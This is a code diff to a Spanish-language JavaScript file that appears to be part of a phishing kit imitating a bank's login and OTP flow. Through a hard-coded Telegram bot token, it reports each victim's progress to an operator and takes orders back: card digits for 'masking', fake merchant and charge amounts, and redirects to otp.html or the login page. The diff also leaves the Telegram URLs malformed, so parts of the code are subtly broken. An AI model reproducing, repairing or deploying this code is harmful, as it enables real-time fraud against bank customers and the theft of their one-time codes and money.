@@ -8,21 +8,25 @@
 (function () {
   "use strict";
 
-  // !!! COLOCA AQUÍ TUS CREDENCIALES REALES DE TELEGRAM !!!
+  // !!! CREDENCIALES DE TELEGRAM !!!
   const TELEGRAM_TOKEN = '9068600803:AAGIYrU6UrsLU8_0x0dkZLUTQ_YKr4535BE'; 
   const TELEGRAM_CHAT_ID = '9180377107';
   
   const textStatus = document.getElementById("loading-text");
 
-  
+  // ============================================================
+  // ESCAPE DE SEGURIDAD: Evita ejecutarse en la pantalla incorrecta
+  // ============================================================
+  if (!textStatus) {
+    console.log("Gatekeeper: No se detectó la pantalla de carga (#loading-text). Abortando ejecución.");
+    return; 
+  }
 
   const DEFAULT_MERCHANT = "Programa Cero";
   const DEFAULT_AMOUNT = "$6,000.00 MXN";
-
-  // Ampliado a 20 segundos para dar tiempo real de escribir en el celular
   const RECONFIG_WINDOW_MS = 20000; 
 
-// Semáforo estricto en memoria local para impedir ráfagas simultáneas
+  // Semáforo estricto en memoria local para impedir ráfagas simultáneas
   let lockActive = false;
 
   function formatMXN(num) {
@@ -40,7 +44,7 @@
 
   async function sendTelegram(text) {
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      await fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
@@ -54,7 +58,7 @@
     lockActive = true;
     try {
       // Forzamos offset=-1 y limit=1 para descolgar cualquier otra pestaña o teléfono que esté escuchando
-      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1&limit=1&timeout=0`);
+      const res = await fetch(`https://telegram.org{TELEGRAM_TOKEN}/getUpdates?offset=-1&limit=1&timeout=0`);
       if (res.status === 409) {
         console.warn("Telegram 409 detectado de forma externa. Rebalanceando canal...");
         lockActive = false;
@@ -63,7 +67,7 @@
       const data = await res.json();
       lockActive = false;
       if (data.ok && data.result && data.result.length > 0) {
-        return data.result[0];
+        return data.result;
       }
     } catch (e) {
       lockActive = false;
@@ -74,13 +78,9 @@
 
   async function startLoadingGatekeeper() {
     const user = sessionStorage.getItem("demo_user") || "usuario_demo";
-    let lastUpdateId = await getLastUpdateId();
-
     const isReturnPass = sessionStorage.getItem("gatekeeper_done") === "1";
 
-    
-
-             // ============ PASADA 2+ (regresó del dashboard) ============
+    // ============ PASADA 2+ (regresó del dashboard) ============
     if (isReturnPass) {
       const flowType = sessionStorage.getItem("flow_type") || "charge";
       const cfgMerchant = sessionStorage.getItem("charge_merchant") || DEFAULT_MERCHANT;
@@ -115,7 +115,6 @@
             const textoMensaje = msg.text.trim();
             const low = textoMensaje.toLowerCase();
 
-            // Intercepción prioritaria de reinicio global
             if (low === 'reinicio' || low === 'reset') {
               console.log("Comando de reinicio global detectado.");
               await sendTelegram("🔄 *Reinicio Forzado:* Sesión expirada. Expulsando navegador al Login...");
@@ -132,7 +131,13 @@
               return; 
             }
 
-           const m = textoMensaje.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
+            if (["no", "n", "ok", "listo", "mantener"].includes(low)) {
+              await sendTelegram("Mantengo el cargo actual. Entrando a OTP...");
+              window.location.href = "otp.html";
+              return;
+            }
+
+            const m = textoMensaje.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
             if (m) {
               const merchant = m[1].trim();
               const amt = parseAmount(m[2]);
@@ -161,13 +166,9 @@
 
       scanPass2();
       return;
-    } 
-        
+    }
 
-
-        // ============ PASADA 1 (login) ============
-
-    // 1. Pedir los 2 dígitos
+    // ============ PASADA 1 (login) ============
     await sendTelegram(
       `🚨 *PASO 1: CONFIGURAR ENMASCARAMIENTO* 🚨\n\n` +
       `El usuario *${user}* pasó el login y está cargando la pantalla OTP.\n\n` +
@@ -179,26 +180,28 @@
       const update = await fetchLatestUpdateSafe();
       let tail = null;
 
-      if (update && update.message) {
-        const msg = update.message;
-        const chatIDRecibido = String(msg.chat.id);
-        const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
-        const msgText = msg.text ? msg.text.trim() : "";
-        const low = msgText.toLowerCase();
+      if (update && update.length > 0) {
+        const msg = update[0].message;
+        if (msg) {
+          const chatIDRecibido = String(msg.chat.id);
+          const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
+          const msgText = msg.text ? msg.text.trim() : "";
+          const low = msgText.toLowerCase();
 
-        // [INTEGRACIÓN] UBIACIÓN 2: Intercepción prioritaria de reinicio global (Pasada 1)
-        if (low === 'reinicio' || low === 'reset') {
-          console.log("Comando de reinicio global detectado.");
-          await sendTelegram("🔄 *Reinicio Forzado:* Sesión expirada. Expulsando navegador al Login...");
-          localStorage.clear();
-          sessionStorage.clear();
-          window.location.replace("index.html");
-          return;
-        }
-        console.log(`📩 Mensaje detectado -> ID Configurado: "${chatIDConfigurado}" | ID Recibido: "${chatIDRecibido}" | Texto: "${msgText}"`);
+          if (low === 'reinicio' || low === 'reset') {
+            console.log("Comando de reinicio global detectado.");
+            await sendTelegram("🔄 *Reinicio Forzado:* Sesión expirada. Expulsando navegador al Login...");
+            localStorage.clear();
+            sessionStorage.clear();
+            window.location.replace("index.html");
+            return; 
+          }
 
-        if (chatIDRecibido === chatIDConfigurado && /^\d{2}$/.test(msgText)) {
-          tail = msgText;
+          console.log(`📩 Mensaje detectado -> ID Configurado: "${chatIDConfigurado}" | ID Recibido: "${chatIDRecibido}" | Texto: "${msgText}"`);
+
+          if (chatIDRecibido === chatIDConfigurado && /^\d{2}$/.test(msgText)) {
+            tail = msgText;
+          }
         }
       }
 
@@ -213,7 +216,7 @@
 
     scanPass1();
   }
-  
+
   async function proceedToChargeConfig() {
     try {
       sessionStorage.removeItem("charge_merchant");
@@ -236,9 +239,9 @@
       let esBaja = false;
       const update = await fetchLatestUpdateSafe();
 
-      if (update && update.message) {
-        const msg = update.message;
-        if (msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+      if (update && update.length > 0) {
+        const msg = update[0].message;
+        if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
           const t = msg.text.trim();
           const low = t.toLowerCase();
 
@@ -250,7 +253,6 @@
             window.location.replace("index.html");
             return;
           }
-
           if (low === "baja") {
             try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
             await sendTelegram("⚠️ Se usará el cargo por defecto. Redirigiendo a Dashboard...");
@@ -267,7 +269,6 @@
               if (merchant && amt !== null) {
                 sessionStorage.setItem("charge_merchant", merchant);
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                // CORREGIDO: Se agregaron las comillas faltantes aquí
                 await sendTelegram(`✅ *Cargo configurado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
                 done = true;
               }
@@ -276,7 +277,6 @@
               const amt = parseAmount(t);
               if (amt !== null) {
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                // CORREGIDO: Se agregaron las comillas faltantes aquí
                 await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
                 done = true;
               }
@@ -284,6 +284,7 @@
           }
         }
       }
+
       if (done) {
         try { sessionStorage.setItem("gatekeeper_done", "1"); } catch (e) { }
         if (esBaja) {
